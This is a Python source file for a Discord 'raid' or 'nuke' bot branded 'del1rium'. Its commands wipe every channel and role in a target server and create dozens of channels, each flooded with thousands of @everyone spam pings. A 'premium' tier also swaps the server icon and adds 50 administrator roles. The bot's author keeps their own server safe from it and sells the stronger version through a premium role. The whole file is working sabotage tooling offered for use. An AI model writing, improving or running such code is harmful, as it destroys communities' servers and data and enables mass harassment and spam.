import discord
from discord.ext import commands
import asyncio
import os
import aiohttp
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# --- SECURITY AND PREMIUM CONFIGURATION ---
# The ID of your central server. This server will be protected.
CENTRAL_SERVER_ID = 1453920087194206394  # IMPORTANT: REPLACE THIS with your server ID!!
# The ID of the "Premium" role in your central server.
PREMIUM_ROLE_ID = 1458177413325259035      # IMPORTANT: REPLACE THIS with your premium role ID!!

# --- DEFAULT NUKE CONFIGURATION ---
CHANNEL_NAME_CONFIG = "raid-by-del1rium"
SPAM_TEXT_CONFIG = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents)

# --- PREMIUM CHECK FUNCTION ---
def is_premium():
    async def predicate(ctx):
        central_server = bot.get_guild(CENTRAL_SERVER_ID)
        if not central_server:
            print("CRITICAL ERROR: Bot is not in the central server. Cannot verify premium status.")
            await ctx.send("System Error: Could not verify premium status. Please contact the developer.")
            return False
        
        member_in_central = central_server.get_member(ctx.author.id)
        if not member_in_central:
            await ctx.send("Access Denied: You must be a member of the main server to use premium commands.")
            return False

        for role in member_in_central.roles:
            if role.id == PREMIUM_ROLE_ID:
                return True

        await ctx.send("Access Denied: This is a premium command. Please visit our main server for more information.")
        return False
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f'Raid Bot connected as {bot.user.name}')
    print(f'Protected Central Server ID: {CENTRAL_SERVER_ID}')
    print('Commands: :nuke, :premiumnuke, :nukeconfig')

# --- CONFIGURATION COMMAND ---
@bot.command(name='nukeconfig')
@commands.has_permissions(administrator=True)
async def nuke_config(ctx, channel_name: str, *, spam_text: str):
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Command Disabled: This command cannot be used in the main server.")
        return

    global CHANNEL_NAME_CONFIG, SPAM_TEXT_CONFIG
    CHANNEL_NAME_CONFIG = channel_name
    SPAM_TEXT_CONFIG = spam_text
    
    await ctx.message.delete()
    
    embed = discord.Embed(
        title="Nuke Configuration Updated",
        description="The settings for the next raid have been saved.",
        color=discord.Color.blue()
    )
    embed.add_field(name="Channel Name Format", value=f"`{channel_name}-X`", inline=False)
    embed.add_field(name="Spam Text", value=f"```{spam_text}```", inline=False)
    embed.set_footer(text="These settings will be used by the :nuke and :premiumnuke commands.")
    
    confirmation_msg = await ctx.send(embed=embed)
    await asyncio.sleep(15)
    await confirmation_msg.delete()

# --- NUKE COMMANDS ---
@bot.command(name='nuke')
@commands.has_permissions(administrator=True)
async def nuke_normal(ctx):
    await execute_nuke(ctx, 50, 1000, is_premium=False)

@bot.command(name='premiumnuke')
@commands.has_permissions(administrator=True)
@is_premium()
async def premium_nuke(ctx):
    await execute_nuke(ctx, 100, 2000, is_premium=True)

# --- CENTRAL NUKE LOGIC WITH PROTECTION ---
async def execute_nuke(ctx, num_channels, num_pings, is_premium: bool):
    guild = ctx.guild
    
    # CRITICAL SECURITY LAYER
    if guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Action Blocked: Nuke commands are permanently disabled in this server for protection.")
        print(f"BLOCKED: {ctx.author.name} attempted to execute a nuke in the protected central server.")
        return

    command_type = "PREMIUM NUKE" if is_premium else "STANDARD NUKE"
    print(f"Initiating {command_type} in: {guild.name} by {ctx.author.name}")

    if is_premium:
        await execute_premium_actions(guild)
    
    print("Phase 1: Deleting channels and roles...")
    roles_to_delete = [role for role in guild.roles if not role.is_default() and not role.managed]
    await asyncio.gather(*(role.delete() for role in roles_to_delete), *(channel.delete() for channel in guild.channels), return_exceptions=True)
    print("Channels and roles deleted.")

    print(f"Phase 2: Creating {num_channels} channels and initiating {num_pings} pings in each...")
    async def create_and_spam(i):
        try:
            channel = await guild.create_text_channel(f'{CHANNEL_NAME_CONFIG}-{i+1}')
            await spam_pings(channel, SPAM_TEXT_CONFIG, num_pings)
        except Exception: pass
    await asyncio.gather(*(create_and_spam(i) for i in range(num_channels)))
    print(f"{command_type} finished.")

# --- HELPER FUNCTIONS ---
async def spam_pings(channel, spam_text, amount):
    for _ in range(amount):
        try:
            await channel.send(spam_text)
            await asyncio.sleep(0.15)
        except Exception: break

async def execute_premium_actions(guild):
    print("Executing additional premium actions...")
    tasks = [change_server_icon(guild), create_chaotic_roles(guild)]
    await asyncio.gather(*tasks)
    print("Premium actions completed.")

async def change_server_icon(guild):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(RAID_ICON_URL) as resp:
                if resp.status == 200:
                    await guild.edit(icon=await resp.read(), reason="Premium Nuke")
                    print("Server icon changed.")
    except Exception as e: print(f"Could not change server icon: {e}")

async def create_chaotic_roles(guild):
    print("Creating 50 chaotic roles...")
    tasks = [guild.create_role(name=f"hacked-by-del1rium-{i}", permissions=discord.Permissions(administrator=True), color=discord.Color.random()) for i in range(50)]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You must have administrator permissions to use this command.")
    elif isinstance(error, commands.CheckFailure):
        print(f"Premium access denied for user: {ctx.author.name}")
    else:
        print(f"An ignored command error occurred: {error}")

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("Error: DISCORD_TOKEN is not configured.")

